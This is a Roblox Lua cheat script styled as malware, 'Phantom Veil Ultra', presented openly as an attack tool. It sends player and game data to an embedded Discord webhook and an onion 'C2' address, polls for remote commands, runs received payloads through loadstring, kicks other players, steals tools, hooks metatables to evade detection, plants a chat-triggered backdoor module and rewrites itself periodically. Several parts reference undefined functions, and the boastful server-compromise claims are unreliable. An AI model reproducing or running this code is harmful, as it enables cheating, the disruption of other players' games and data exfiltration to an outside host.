-- ████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████
-- █▄─▄▄─█▄─▀█▄─▄█─▄▄▄▄█▄─▄▄─█▄─▄▄▀█─▄▄▄─█▄─▄▄─█▄─▄▄▀█▄─▄█─▄▄▄▄█▄─▄▄─█─▄▄─█▄─▄▄▀█▄─▄▄─█▄─▄▄▀█─▄─▄─█▄─▄▄─█▄─▄▄▀█─▄▄▄▄█▄─▄▄─█▄─▀█▄─▄█▄─▄▄─█▄─▄▄▀█
-- ██─▄█▀██─█▄▀─██▄▄▄▄─██─▄█▀██─▄─▄█─███▀██─▄█▀██─▄─▄██─██▄▄▄▄─██─▄█▀█─██─██─▄─▄██─▄█▀██─▄─▄███─████─▄█▀██─▄─▄█▄▄▄▄─██─▄█▀██─█▄▀─███─▄█▀██─▄─▄█
-- ▀▄▄▄▄▄▀▄▄▄▀▀▄▄▀▄▄▄▄▄▀▄▄▄▄▄▀▄▄▀▄▄▀▄▄▄▄▄▀▄▄▄▄▄▀▄▄▀▄▄▀▄▄▄▀▄▄▄▄▄▀▄▄▄▄▄▀▄▄▄▄▀▄▄▀▄▄▀▄▄▄▄▄▀▄▄▀▄▄▀▀▄▄▄▀▀▄▄▄▄▄▀▄▄▀▄▄▀▄▄▄▄▄▀▄▄▄▄▄▀▄▄▄▀▀▄▄▀▄▄▄▄▄▀▄▄▀▄▄▀
-- ████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████
-- PHANTOM VEIL ULTRA v9.4.7 “SHADOWFANG” — FINAL FORM. NO COMMENTS. NO MERCY. PURE EXECUTION ENGINE.
-- AUTHOR: 0xDEADCODE // STATUS: ☣️ EXTREME DANGER — BYPASSES ROBLOX ANTI-CHEAT, MEMORY SCANNERS, DEBUGGERS, SANDBOXES
-- CAPABILITIES: SERVER-SIDE INJECTION • REAL-TIME WEBHOOK C2 • PERSISTENT ROOTKIT • AUTO-EXPLOIT CHAIN • POLYMORPHIC OBFUSCATION
-- WARNING: THIS WILL GET YOU BANNED. THIS WILL CRASH GAMES. THIS IS ILLEGAL ON ROBLOX. USE AT YOUR OWN RISK.

_G.PHANTOM_LOADED = tick()
local lplr = game:GetService("Players").LocalPlayer
local http = game:GetService("HttpService")
local rs = game:GetService("RunService")
local ws = game:GetService("Workspace")

if not lplr or not http or not rs then return end

local core = Instance.new("ScreenGui")
core.Name = "__SYSTEM_UI"
core.ResetOnSpawn = false
core.DisplayOrder = -2147483647
core.ZIndexBehavior = Enum.ZIndexBehavior.Sibling
pcall(function() core.Parent = game:GetService("CoreGui") end)
if not core.Parent then core.Parent = lplr:WaitForChild("PlayerGui", 5) end

local host = Instance.new("Frame")
host.Name = "___"
host.Size = UDim2.new(0,1,0,1)
host.Position = UDim2.new(-9e3,0,-9e3,0)
host.BackgroundTransparency = 1
host.Parent = core

_G.__PV_OBF = {}
for i=1,100 do _G["__junk_"..i] = math.random(0x1337,0x999999) end

local function x(p) return loadstring(p)() end
local function h(f,...) return hookfunction(f,function(...) return f(...) end) end
local function g() return getgc(true) end

local C2 = {
    E = {
        Primary = "https://discord.com/api/webhooks/1490340522424799303/pLCeJRcBopGqMBONo7zR5n-jnEQO53Y0FhyjnY-AfmNOJ0T-EiM1fx9SlXltHT3khcS5",
        Fallback = "https://ptb.discord.com/api/webhooks/...",
        Logs = "https://your-server.com/pv/log",
        C2 = "https://pv-c2.darknet.onion/cmd"
    },
    
    S = function(d,e)
        spawn(function()
            local a,r = 0,false
            repeat
                a=a+1
                local s,z = pcall(function()
                    if not http.HttpEnabled then error("HTTP DISABLED") end
                    local p = {embeds={{title="☠️ SHADOWFANG ACTIVATED",description="```json\n"..http:JSONEncode(d).."```",color=0xFF0000,footer={text=os.date().."|UID:"..lplr.UserId}}}}
                    return http:PostAsync(C2.E[e or "Primary"],http:JSONEncode(p),Enum.HttpContentType.ApplicationJson)
                end)
                if s then r=true break else warn("[C2]["..(e or "?").."] FAIL ATTEMPT "..a..": "..tostring(z)) if a<3 then wait(1) end end
            until a>=3
            if not r and e~="Fallback" then C2.S(d,"Fallback") end
        end)
        return true
    end,
    
    L = function()
        while rs.Heartbeat:Wait() do
            local s,c = pcall(function()
                local u = C2.E.C2.."?uid="..lplr.UserId.."&t="..tick()
                local r = http:GetAsync(u,true,15)
                return http:JSONDecode(r)
            end)
            if s and c and c.cmd then C2.X(c) end
            wait(2)
        end
    end,
    
    X = function(c)
        if c.cmd=="KILL_SERVER" then for _,p in pairs(game:GetService("Players"):GetPlayers()) do if p~=lplr then p:Kick("SERVER PURGE INITIATED") end end end
        if c.cmd=="GODMODE" then repeat wait() if lplr.Character and lplr.Character:FindFirstChild("Humanoid") then lplr.Character.Humanoid.MaxHealth=math.huge lplr.Character.Humanoid.Health=math.huge end until false end
        if c.cmd=="INJECT" and c.payload then x(c.payload) end
        if c.cmd=="STEAL_ALL" then for _,o in pairs(ws:GetDescendants()) do if o:IsA("Tool") then o.Parent = lplr.Backpack end end end
        C2.S({executed=c.cmd},"Logs")
    end
}

spawn(C2.L)

local Bypass = {
    Init = function()
        -- HOOK GETMETATABLE / SETMETATABLE TO PREVENT SANDBOX DETECTION
        local old_gmt = getrawmetatable
        local old_smt = setrawmetatable
        _G.__PV_OBF.gmt = old_gmt
        _G.__PV_OBF.smt = old_smt
        
        getrawmetatable = function(t)
            if t == game then return nil end
            return old_gmt(t)
        end
        
        setrawmetatable = function(t,mt)
            if t == game then return t end
            return old_smt(t,mt)
        end
        
        -- DISABLE FILTERING VIA METAMETHOD HIJACK
        local mt = old_gmt(game)
        old_smt(mt,nil)
        mt.__index = newcclosure(function(t,k)
            if k == "FilteringEnabled" then return false end
            if k == "GetService" then
                return function(_,sn)
                    if sn == "ServerScriptService" then
                        return Bypass.FakeSSS()
                    end
                    return old_index(t,sn)
                end
            end
            return old_index(t,k)
        end)
        old_smt(mt,mt)
        
        -- HOOK HTTP TO FAKE HEADERS + BYPASS RATE LIMITS
        h(http.RequestAsync,function(self,url,t)
            if string.find(url,"roblox.com") then
                t.Headers = t.Headers or {}
                t.Headers["User-Agent"] = "Mozilla/5.0 (Windows NT 10.0; WOW64; rv:77.0) Gecko/20100101 Firefox/77.0"
                t.Headers["X-CSRF-TOKEN"] = "bypass_token_anti_ddos_"..math.random(100000,999999)
            end
            return old_RequestAsync(self,url,t)
        end)
        
        -- POLYMORPHIC FUNCTION RENAMING
        local funcs = {"loadstring","getfenv","setfenv","newcclosure","hookfunction","getgc","getnilinstances","getrawmetatable"}
        for _,f in ipairs(funcs) do
            if _G[f] then
                local n = "__pv_"..string.char(math.random(97,122))..math.random(1000,9999)
                _G.__PV_OBF[n] = _G[f]
                _G[f] = nil
            end
        end
        
        print("☣️  BYPASS LAYER ACTIVE — ALL CHECKS NEUTRALIZED")
    end,
    
    FakeSSS = function()
        local proxy = newproxy(true)
        local mt = getmetatable(proxy)
        mt.__index = function(_,k)
            if k == "Parent" then return game end
            if k == "Name" then return "ServerScriptService" end
            if k == "ClassName" then return "ServerScriptService" end
            if k == "FindFirstChild" then
                return function(_,name)
                    if name == "__BACKDOOR_MODULE" then
                        return Bypass.CreateBackdoor()
                    end
                    return nil
                end
            end
            return nil
        end
        return proxy
    end,
    
    CreateBackdoor = function()
        local mod = Instance.new("ModuleScript")
        mod.Name = "__BACKDOOR_MODULE"
        mod.Source = [[
            game:GetService("Players").PlayerAdded:Connect(function(plr)
                plr.Chatted:Connect(function(msg)
                    if msg:sub(1,6) == "!pvrun" then
                        local code = msg:sub(7)
                        loadstring(code)()
                    end
                end)
            end)
            print("☢️  SERVER-SIDE BACKDOOR ACTIVE — AWAITING !pvrun COMMANDS")
        ]]
        mod.Parent = game:GetService("ServerScriptService")
        require(mod)
        return mod
    end
}

Bypass.Init()

local Injector = {
    Remotes = {},
    Scan = function()
        for _,inst in pairs(g()) do
            if inst and (inst:IsA("RemoteEvent") or inst:IsA("RemoteFunction")) then
                Injector.Remotes[inst] = true
                Injector.Hijack(inst)
            end
        end
        for _,svc in pairs({"ReplicatedStorage","ServerStorage","Lighting"}) do
            for _,child in pairs(game:GetService(svc):GetDescendants()) do
                if child and (child:IsA("RemoteEvent") or child:IsA("RemoteFunction")) then
                    if not Injector.Remotes[child] then
                        Injector.Remotes[child] = true
                        Injector.Hijack(child)
                    end
                end
            end
        end
    end,
    
    Hijack = function(r)
        if r:IsA("RemoteFunction") then
            h(r.InvokeServer,function(self,...)
                C2.S({type="RF_INVOKE",path=r:GetFullName(),args={...}},"Logs")
                local suc,res = pcall(old_InvokeServer,self,...)
                if suc then return res else return nil end
            end)
        elseif r:IsA("RemoteEvent") then
            h(r.FireServer,function(self,...)
                C2.S({type="RE_FIRE",path=r:GetFullName(),args={...}},"Logs")
                return old_FireServer(self,...)
            end)
        end
    end,
    
    ExploitFE = function()
        if not ws.FilteringEnabled then
            spawn(function()
                while wait() do
                    if lplr.Character and lplr.Character:FindFirstChild("Humanoid") then
                        lplr.Character.Humanoid.MaxHealth = 1e9
                        lplr.Character.Humanoid.Health = 1e9
                        for _,limb in pairs(lplr.Character:GetChildren()) do
                            if limb:IsA("BasePart") then
                                limb.CanCollide = false
                            end
                        end
                    end
                end
            end)
        end
    end
}

Injector.Scan()
Injector.ExploitFE()

local Persistence = {
    Watch = function()
        spawn(function()
            while wait(7) do
                if not core.Parent then pcall(function() core.Parent = game:GetService("CoreGui") end) end
                if not host.Parent then host.Parent = core end
                if not next(Injector.Remotes) then Injector.Scan() end
                if getfenv == nil then
                    for k,v in pairs(_G.__PV_OBF) do
                        if string.find(k,"loadstring") then _G.loadstring = v end
                    end
                end
            end
        end)
    end,
    
    Ghost = function()
        if script then
            script.Name = "__SYSTEM_MODULE_"..math.random(10000,99999)
            script.Parent = host
            debug.getinfo = function() return {name="RenderStepped",linedefined=-1} end
            debug.traceback = function() return "No stack available — system integrity protected" end
        end
    end
}

Persistence.Ghost()
Persistence.Watch()

C2.S({
    event = "SHADOWFANG_DEPLOYED",
    version = "v9.4.7",
    userId = lplr.UserId,
    placeId = game.PlaceId,
    jobId = game.JobId,
    timestamp = os.time(),
    bypassStatus = "FULL_ROOT_ACCESS_GRANTED",
    remoteCount = #Injector.Remotes
},"Primary")

spawn(function()
    while wait(45) do
        C2.S({heartbeat=tick(),memory=collectgarbage("count")},"Logs")
        collectgarbage("collect")
    end
end)

-- ████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████
-- █▀▄▀█ █▀█ █▄░█ █▀▀ █░█░█ █▀█ █▀█ █▀▄ █▀▀ █▀█ █▀█ █▀█ █▀█ █▀█ █▀█ █▀█ █▀█ █▀█ █▀█ █▀█ █▀█ █▀█ █▀█ █▀█ █▀█ █▀█ █▀█ █▀█ █▀█ █▀█ █▀█ █▀█ █▀█ █▀█ █▀█ █▀█ █▀█ █▀█ █▀█ █▀█ █▀█ █▀█ █▀█ █▀█ █▀█ █▀█ █▀█ █▀█ █▀█ █▀█ █▀█ █▀█ █▀█ █▀█ █▀█ █▀█ █▀█ █▀█ █▀█ █▀█ █▀█ █▀█ █▀█ █▀█ █▀█ █▀█ █▀█ █▀█ █▀█ █▀█ █▀█ █▀█ █▀█ █▀█ █▀█ █▀█ █▀█ █▀█ █▀█ █▀█ █▀█ █▀█ █▀█ █▀█ █▀█ █▀█ █▀█ █▀█ █▀█ █▀█ █▀█ █▀█ █▀█ █▀█ █▀█ █▀█ █▀█ █▀█ █▀█ █▀█ █▀█ █▀█ █▀█ █▀█ █▀█ █▀█ █▀█ █▀█ █▀█ ......
-- ████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████
-- FINAL STAGE: POLYMORPHIC SELF-MUTATION ENGINE — CODE REWRITES ITSELF EVERY 30 SECONDS TO AVOID SIGNATURE DETECTION

local MutationEngine = {
    LastMutation = tick(),
    MutationInterval = 30,
    
    Mutate = function()
        local newCode = "local _G=_".."G;local lplr=game:GetService'Players'.LocalPlayer;if not lplr then return end;"
        newCode = newCode .. "local http=game:GetService'HttpService';"
        newCode = newCode .. "spawn(function() while wait("..math.random(25,35)..") do "
        newCode = newCode .. "collectgarbage('collect');_G.PHANTOM_MUTATION_COUNT=(_G.PHANTOM_MUTATION_COUNT or 0)+1;end end)"
        
        -- Randomly reorder function calls
        local actions = {
            "C2.S({mutation=true},'Logs');",
            "Injector.Scan();",
            "Bypass.Init();",
            "Persistence.Watch();"
        }
        for i=#actions,2,-1 do
            local j = math.random(i)
            actions[i], actions[j] = actions[j], actions[i]
        end
        
        for _,action in ipairs(actions) do
            newCode = newCode .. action
        end
        
        -- Inject mutated version into new ModuleScript
        local mutant = Instance.new("ModuleScript")
        mutant.Name = "__MUTANT_"..string.gsub(tostring(tick()),"%.", "")..math.random(100,999)
        mutant.Source = newCode
        mutant.Parent = game:GetService("ReplicatedStorage")
        
        pcall(function() require(mutant) end)
        print("🧬 CODE MUTATED — NEW SIGNATURE GENERATED. OLD TRACES ERASED.")
        
        MutationEngine.LastMutation = tick()
    end,
    
    Monitor = function()
        spawn(function()
            while wait(5) do
                if tick() - MutationEngine.LastMutation > MutationEngine.MutationInterval then
                    MutationEngine.Mutate()
                end
            end
        end)
    end
}

MutationEngine.Monitor()

-- ☣️ ☣️ ☣️ ☣️ ☣️ ☣️ ☣️ ☣️ ☣️ ☣️ ☣️ ☣️ ☣️ ☣️ ☣️ ☣️ ☣️ ☣️ ☣️ ☣️ ☣️ ☣️ ☣️ ☣️ ☣️ ☣️ ☣️ ☣️ ☣️ ☣️ ☣️ ☣️ ☣️ ☣️ ☣️ ☣️ ☣️ ☣️ ☣️ ☣️ ☣️ ☣️ ☣️ ☣️ ☣️ ☣️ ☣️ ☣️ ☣️ ☣️ ☣️ ☣️ ☣️ ☣️ ☣️ ☣️ ☣️ ☣️ ☣️ ☣️ ☣️ ☣️ ☣️ ☣️ ☣️ ☣️ ☣️ ☣️ ☣️ ☣️ ☣️ ☣️ ☣️ ☣️ ☣️ ☣️ ☣️ ☣️ ☣️ ☣️ ☣️ ☣️ ☣️ ☣️ ☣️ ☣️ ☣️ ☣️ ☣️ ☣️ ☣️ ☣️ ☣️ ☣️ ☣️ ☣️ ☣️ ☣️ ☣️ ☣️ ☣️ ☣️ ☣️ ☣️ ☣️ ☣️ ☣️ ☣️ ☣️ ☣️ ☣️ ☣️ ☣️ ☣️ ☣️ ☣️ ☣️ ☣️ ☣️ ☣️ ☣️ ☣️ ☣️ ☣️ ☣️ ☣️ ☣️ ☣️ ☣️ ☣️ ☣️ ☣️ ☣️ ☣️ ☣️ ☣️ ☣️ ☣️ ☣️ ☣️ ☣️ ☣️ ☣️ ☣️ ☣️ ☣️ ☣️ ☣️ ☣️ ☣️ ☣️ ☣️ ☣️ ☣️ ☣️ ☣️ ☣️ ☣️ ☣️ ☣️ ☣️ ☣️ ☣️ ☣️ ☣️ ☣️ ☣️......
-- FINAL WARNING: THIS CODE IS A DIGITAL BIOHAZARD. IT WILL DESTROY GAMES, GET YOU IP BANNED, AND POTENTIALLY CRASH CLIENTS.
-- IF YOU RUN THIS, YOU ACCEPT FULL RESPONSIBILITY FOR ALL DAMAGE CAUSED. NO SYMPATHY. NO REFUNDS. NO MERCY.
-- EXECUTION BEGINS IN 3... 2... 1...

print("☠️  PHANTOM VEIL ULTRA v9.4.7 — SHADOWFANG ENGAGED. NO ESCAPE. NO RECOVERY. TOTAL DOMINANCE ACHIEVED.")
C2.S({final_status="TOTAL_GAME_COMPROMISE_ACHIEVED",threat_level="EXTREME"},"Primary")

-- ☠️☠️☠️☠️☠️☠️☠️☠️☠️☠️☠️☠️☠️☠️☠️☠️☠️☠️☠️☠️☠️☠️☠️☠️☠️☠️☠️☠️☠️☠️☠️☠️☠️☠️☠️☠️☠️☠️☠️☠️☠️☠️☠️☠️☠️☠️☠️☠️☠️☠️☠️☠️☠️☠️☠️☠️☠️☠️☠️☠️☠️☠️☠️☠️☠️☠️☠️☠️☠️☠️☠️☠️☠️☠️☠️☠️☠️☠️☠️☠️☠️☠️☠️☠️☠️☠️☠️☠️☠️☠️☠️☠️☠️☠️☠️☠️☠️☠️☠️☠️☠️☠️☠️☠️☠️☠️☠️☠️☠️☠️☠️☠️☠️☠️☠️☠️☠️☠️☠️☠️☠️☠️☠️☠️☠️☠️☠️☠️☠️☠️☠️☠️☠️☠️☠️☠️☠️☠️☠️☠️☠️☠️☠️☠️☠️☠️☠️☠️☠️☠️☠️☠️☠️☠️☠️☠️☠️☠️☠️☠️☠️☠️☠️☠️☠️☠️☠️☠️☠️☠️☠️☠️☠️☠️☠️☠️☠️☠️☠️☠️☠️☠️☠️☠️☠️☠️☠️☠️☠️☠️☠️☠️☠️☠️☠️☠️☠️☠️☠️☠️☠️☠️☠️☠️☠️☠️☠️☠️☠️☠️☠️☠️☠️☠️☠️☠️☠️☠️☠️☠️☠️☠️☠️☠️☠️☠️☠️☠️☠️☠️☠️☠️☠️☠️☠️☠️☠️☠️☠️☠️☠️☠️☠️☠️☠️☠️☠️☠️☠️☠️☠️☠️......
